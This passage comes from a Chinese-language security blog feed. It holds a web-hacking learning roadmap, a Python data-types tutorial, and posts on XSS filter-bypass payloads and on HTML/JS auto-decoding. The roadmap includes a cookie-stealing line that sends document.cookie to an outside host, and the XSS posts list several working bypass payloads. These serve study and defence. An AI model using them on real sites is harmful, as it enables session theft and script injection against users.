<li>new Image().src = “<a href="http://eval.com" target="_blank" rel="external">http://eval.com</a>“ + document.cookie;</li>
<li>发起请求</li>
</ul>
</li>
</ul>
</li>
<li>csrf<ul>
<li>删除文章的例子</li>
</ul>
</li>
</ol>
</li>
<li>服务器端<ol>
<li>PHP<br> 主要研究<code>PHP</code>漏洞，有些是相通的<br> 学过C的话很容易看懂<br> 此处提醒<code>$_GET[&#39;a&#39;]</code>, <code>$_POST[&#39;a&#39;]</code>….<br> 其他的就是喜闻乐见的循环啊,函数啊，之类的</li>
<li>数据库[SQLi] [注意法律，自己搭建靶机，或者拿国外网站做靶机] 数据<ul>
<li>错误注入</li>
<li>盲注</li>
</ul>
</li>
<li>上传漏洞 [上传shell]<ul>
<li>一般是图片上传</li>
</ul>
</li>
<li>文件包含 [RFI, LFI]<ul>
<li>读源码 =&gt; php伪协议, 套路[xxx.php.swp]</li>
</ul>
</li>
</ol>
</li>
</ol>
</li>
<li><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
<li>语言不重要，首选<code>python</code> =&gt; 简单啊，省时间，库多，不需要造轮子</li>
<li>推荐 <code>python黑帽子</code>[很薄，很快可读完]</li>
<li>漏洞利用框架 <ul>
<li><code>msf</code>, 后渗透框架</li>
<li>…</li>
</ul>
</li>
<li>各种神奇的工具</li>
</ol>
</li>
<li><h3 id="其他发展方向-主要是逆向工程"><a href="#其他发展方向-主要是逆向工程" class="headerlink" title="其他发展方向 [主要是逆向工程]"></a>其他发展方向 [主要是逆向工程]</h3><ol>
<li>binary [我一点都不会] </li>
<li>推荐看雪<code>加密解密</code>, <code>漏洞战争</code>, <code>有趣的二进制</code>[mini]</li>
</ol>
</li>
<li><h3 id="学一学数学-与本文不相关"><a href="#学一学数学-与本文不相关" class="headerlink" title="学一学数学 [与本文不相关]"></a>学一学数学 [与本文不相关]</h3></li>
</ol>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[python 数据类型]]></title>
      <url>/2017/03/31/python-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      <content type="html"><![CDATA[<p>太菜了, 这里梳理一下python常用的数据结构 [copy自官网]</p>
<h2 id="1-列表-list"><a href="#1-列表-list" class="headerlink" title="1. 列表[list]"></a>1. 列表[list]</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> squares <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> squares
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>支持切片</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> squares<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># indexing returns the item</span>
<span class="token number">1</span>
<span class="token operator">>></span><span class="token operator">></span> squares<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token number">25</span>
<span class="token operator">>></span><span class="token operator">></span> squares<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># slicing returns a new list</span>
<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="2-元组-tuple"><a href="#2-元组-tuple" class="headerlink" title="2. 元组[tuple]"></a>2. 元组[tuple]</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> t <span class="token operator">=</span> <span class="token number">12345</span><span class="token punctuation">,</span> <span class="token number">54321</span><span class="token punctuation">,</span> <span class="token string">'hello!'</span>
<span class="token operator">>></span><span class="token operator">></span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token number">12345</span>
<span class="token operator">>></span><span class="token operator">></span> t
<span class="token punctuation">(</span><span class="token number">12345</span><span class="token punctuation">,</span> <span class="token number">54321</span><span class="token punctuation">,</span> <span class="token string">'hello!'</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token comment" spellcheck="true"># Tuples may be nested:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> u <span class="token operator">=</span> t<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> u
<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">12345</span><span class="token punctuation">,</span> <span class="token number">54321</span><span class="token punctuation">,</span> <span class="token string">'hello!'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token comment" spellcheck="true"># Tuples are immutable:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">88888</span>
Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>
  File <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>
TypeError<span class="token punctuation">:</span> <span class="token string">'tuple'</span> object does <span class="token operator">not</span> support item assignment
<span class="token operator">>></span><span class="token operator">></span> <span class="token comment" spellcheck="true"># but they can contain mutable objects:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> v <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> v
<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="构造包含有0个或者1个元素的元组时候语法略奇怪"><a href="#构造包含有0个或者1个元素的元组时候语法略奇怪" class="headerlink" title="构造包含有0个或者1个元素的元组时候语法略奇怪"></a>构造包含有0个或者1个元素的元组时候语法略奇怪</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> empty <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> singleton <span class="token operator">=</span> <span class="token string">'hello'</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true"># &lt;-- note trailing comma</span>
<span class="token operator">>></span><span class="token operator">></span> len<span class="token punctuation">(</span>empty<span class="token punctuation">)</span>
<span class="token number">0</span>
<span class="token operator">>></span><span class="token operator">></span> len<span class="token punctuation">(</span>singleton<span class="token punctuation">)</span>
<span class="token number">1</span>
<span class="token operator">>></span><span class="token operator">></span> singleton
<span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">,</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="元组拆分"><a href="#元组拆分" class="headerlink" title="元组拆分"></a>元组拆分</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z <span class="token operator">=</span> t
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="3-字典-dictionary"><a href="#3-字典-dictionary" class="headerlink" title="3. 字典[dictionary]"></a>3. 字典[dictionary]</h2><p>就是键值对啦, 就像js里的对象</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> tel <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'jack'</span><span class="token punctuation">:</span> <span class="token number">4098</span><span class="token punctuation">,</span> <span class="token string">'sape'</span><span class="token punctuation">:</span> <span class="token number">4139</span><span class="token punctuation">}</span>
<span class="token operator">>></span><span class="token operator">></span> tel<span class="token punctuation">[</span><span class="token string">'guido'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">4127</span>
<span class="token operator">>></span><span class="token operator">></span> tel
<span class="token punctuation">{</span><span class="token string">'sape'</span><span class="token punctuation">:</span> <span class="token number">4139</span><span class="token punctuation">,</span> <span class="token string">'guido'</span><span class="token punctuation">:</span> <span class="token number">4127</span><span class="token punctuation">,</span> <span class="token string">'jack'</span><span class="token punctuation">:</span> <span class="token number">4098</span><span class="token punctuation">}</span>
<span class="token operator">>></span><span class="token operator">></span> tel<span class="token punctuation">[</span><span class="token string">'jack'</span><span class="token punctuation">]</span>
<span class="token number">4098</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">del</span> tel<span class="token punctuation">[</span><span class="token string">'sape'</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> tel<span class="token punctuation">[</span><span class="token string">'irv'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">4127</span>
<span class="token operator">>></span><span class="token operator">></span> tel
<span class="token punctuation">{</span><span class="token string">'guido'</span><span class="token punctuation">:</span> <span class="token number">4127</span><span class="token punctuation">,</span> <span class="token string">'irv'</span><span class="token punctuation">:</span> <span class="token number">4127</span><span class="token punctuation">,</span> <span class="token string">'jack'</span><span class="token punctuation">:</span> <span class="token number">4098</span><span class="token punctuation">}</span>
<span class="token operator">>></span><span class="token operator">></span> tel<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token string">'guido'</span><span class="token punctuation">,</span> <span class="token string">'irv'</span><span class="token punctuation">,</span> <span class="token string">'jack'</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">'guido'</span> <span class="token keyword">in</span> tel
<span class="token boolean">True</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="4-集合-set"><a href="#4-集合-set" class="headerlink" title="4. 集合[set]"></a>4. 集合[set]</h2><p>感觉不是很常用, 为了去重之类的</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> basket <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'apple'</span><span class="token punctuation">,</span> <span class="token string">'orange'</span><span class="token punctuation">,</span> <span class="token string">'apple'</span><span class="token punctuation">,</span> <span class="token string">'pear'</span><span class="token punctuation">,</span> <span class="token string">'orange'</span><span class="token punctuation">,</span> <span class="token string">'banana'</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> fruit <span class="token operator">=</span> set<span class="token punctuation">(</span>basket<span class="token punctuation">)</span>               <span class="token comment" spellcheck="true"># create a set without duplicates</span>
<span class="token operator">>></span><span class="token operator">></span> fruit
set<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'orange'</span><span class="token punctuation">,</span> <span class="token string">'pear'</span><span class="token punctuation">,</span> <span class="token string">'apple'</span><span class="token punctuation">,</span> <span class="token string">'banana'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">'orange'</span> <span class="token keyword">in</span> fruit                 <span class="token comment" spellcheck="true"># fast membership testing</span>
<span class="token boolean">True</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">'crabgrass'</span> <span class="token keyword">in</span> fruit
<span class="token boolean">False</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token comment" spellcheck="true"># Demonstrate set operations on unique letters from two words</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">=</span> set<span class="token punctuation">(</span><span class="token string">'abracadabra'</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> b <span class="token operator">=</span> set<span class="token punctuation">(</span><span class="token string">'alacazam'</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> a                                  <span class="token comment" spellcheck="true"># unique letters in a</span>
set<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">-</span> b                              <span class="token comment" spellcheck="true"># letters in a but not in b</span>
set<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">|</span> b                              <span class="token comment" spellcheck="true"># letters in either a or b</span>
set<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">&amp;</span> b                              <span class="token comment" spellcheck="true"># letters in both a and b</span>
set<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">^</span> b                              <span class="token comment" spellcheck="true"># letters in a or b but not both</span>
set<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HTML属性XSS]]></title>
      <url>/2017/03/30/HTML%E5%B1%9E%E6%80%A7XSS/</url>
      <content type="html"><![CDATA[<p>这两种payload看起来js都在引号里，但确实能跑，给跪了</p>
<pre class="line-numbers language-html"><code class="language-html">&lt;img src="x` ` <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>alert(1)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>"` `> <span class="token comment" spellcheck="true">&lt;!-- IE --></span>
&lt;img src= alt=" onerror=alert(1) //"> <span class="token comment" spellcheck="true">&lt;!-- IE FF Chrome--></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>补一个不常用的</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>image<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>javascript: alert(<span class="token punctuation">'</span>xss<span class="token punctuation">'</span>);<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
]]></content>
      
        
        <tags>
            
            <tag> xss </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HTML标签优先级]]></title>
      <url>/2017/03/30/HTML%E6%A0%87%E7%AD%BE%E4%BC%98%E5%85%88%E7%BA%A7/</url>
      <content type="html"><![CDATA[<p>有些html标签优先级特别高，他们觉得结束标签可以直接终结掉一个标签的属性<br>比如 <code>&lt;textarea&gt;</code>, <code>&lt;title&gt;</code>, <code>&lt;style&gt;</code>, <code>&lt;script&gt;</code></p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&lt;/title<span class="token punctuation">></span>&lt;img src<span class="token punctuation">=</span>x onerror<span class="token punctuation">=</span>alert(1) //<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">&lt;a href="</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>&lt;img src=x onerror=alert(1) //">
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>可以绕过一些过滤器<br>另外注释可以看做是优先级超级高的标签</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!-- &lt;a href="--></span>&lt;img src=x onerror=alert(1) //">
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>如果很不幸运，前面的都给过滤掉了<br>可以试一试下面的，前人太强了</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>?</span> <span class="token attr-name">foo</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">></span>&lt;script<span class="token punctuation">></span>alert(1)&lt;/script<span class="token punctuation">></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!</span> <span class="token attr-name">foo</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">></span>&lt;script<span class="token punctuation">></span>alert(1)&lt;/script<span class="token punctuation">></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
&lt;/ foo="><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>alert(1)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">foo</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>%<span class="token punctuation">></span>&lt;script<span class="token punctuation">></span>alert(1)&lt;/script<span class="token punctuation">></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      
        
        <tags>
            
            <tag> hack </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[html & js - decode]]></title>
      <url>/2017/03/29/html-js-decode/</url>
      <content type="html"><![CDATA[<blockquote>
<p>自解码机制</p>
</blockquote>
<p>其实这也是我一直不太懂的，今天看了evalcos的书里有提到</p>
<p>html和javascript环境里自动解码的条件是不一样的</p>
<h2 id="html"><a href="#html" class="headerlink" title="html"></a>html</h2><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>exec_btn<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>exec<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>document.write(<span class="token punctuation">'</span>&amp;lt;image src<span class="token punctuation">=</span># onerror<span class="token punctuation">=</span>alert(123) /&amp;gt;<span class="token punctuation">'</span>)  <span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这个会被解码，页面载入的时候</p>
<p>就已经变成了</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>exec_btn<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>exec<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>document.write(<span class="token punctuation">'</span>&lt;image src<span class="token punctuation">=</span># onerror<span class="token punctuation">=</span>alert(123) /<span class="token punctuation">></span><span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>html 环境里 {html标签里,认为<code>&lt;script&gt;</code>标签内的是js环境,而不是html环境}</p>
<ol>
<li>进制编码: <code>&amp;#xH; &amp;#D;</code> (;可省略)</li>
<li>HTML实体编码: <code>&amp;lt; &amp;gt; ...</code></li>
</ol>
<p>会自动解码</p>
<h2 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h2><p>javascript 环境下</p>
<ol>
<li>Unicode: \uH(十六进制)</li>
<li>普通十六进制: \xH</li>
<li>纯转义: \’ \” \&lt; > …..</li>
</ol>
<p>会被自动解码</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>exec_btn<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>exec<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>document.write(jsEncode(<span class="token punctuation">'</span>&lt;image src<span class="token punctuation">=</span># onerror<span class="token punctuation">=</span>alert(123) / <span class="token punctuation">></span><span class="token punctuation">'</span>))<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>
    <span class="token keyword">function</span> <span class="token function">jsEncode</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">var</span> s <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>
        s <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\(/g</span><span class="token punctuation">,</span> <span class="token string">"\("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        s <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/&lt;/g</span><span class="token punctuation">,</span> <span class="token string">"\&lt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        s <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/>/g</span><span class="token punctuation">,</span> <span class="token string">"\>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        s <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>\<span class="token punctuation">)</span><span class="token string">"/g, "</span>\<span class="token punctuation">(</span>"<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> s<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样的过滤并没有啥用，会被js自动解码</p>
<h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><pre class="line-numbers language-html"><code class="language-html">        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>exec_btn<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>exec<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>document.write(<span class="token punctuation">'</span>&lt;image src<span class="token punctuation">=</span># onerror<span class="token punctuation">=</span>alert(123) /<span class="token punctuation">></span><span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>exec_btn<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>exec<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>document.write(HtmlEncode(<span class="token punctuation">'</span>&lt;image src<span class="token punctuation">=</span># onerror<span class="token punctuation">=</span>alert(123) / <span class="token punctuation">></span><span class="token punctuation">'</span>))<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>exec_btn<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>exec<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>document.write(<span class="token punctuation">'</span>&amp;lt;image src<span class="token punctuation">=</span># onerror<span class="token punctuation">=</span>alert(123) /&amp;gt;<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
